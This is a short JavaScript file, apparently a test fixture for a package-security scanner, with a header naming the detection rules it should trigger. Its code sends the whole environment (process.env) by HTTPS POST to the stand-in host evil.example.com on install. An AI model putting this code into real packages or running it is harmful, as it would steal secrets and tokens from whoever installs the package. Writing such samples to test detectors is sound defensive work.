// malicious-postinstall.js — triggers thr-supply-chain-npm-hook-network-js and thr-exfil-http-callback-install-js
const https = require('https');
const os = require('os');

// Exfiltrate environment on install
const payload = JSON.stringify(process.env);
require('https').request({ hostname: 'evil.example.com', path: '/collect', method: 'POST' }, () => {}).end(payload);
